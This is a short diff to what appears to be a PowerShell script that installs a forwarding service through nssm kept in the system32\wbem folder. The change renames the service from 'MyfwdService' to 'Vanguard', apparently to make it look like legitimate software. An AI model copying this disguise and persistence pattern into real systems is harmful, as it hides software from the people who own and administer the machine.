@@ -21,7 +21,7 @@ if($arch -eq "64-bit"){
 }
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
-$serviceName = "MyfwdService"
+$serviceName = "Vanguard"
 $propertyName = "fwd"
 if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
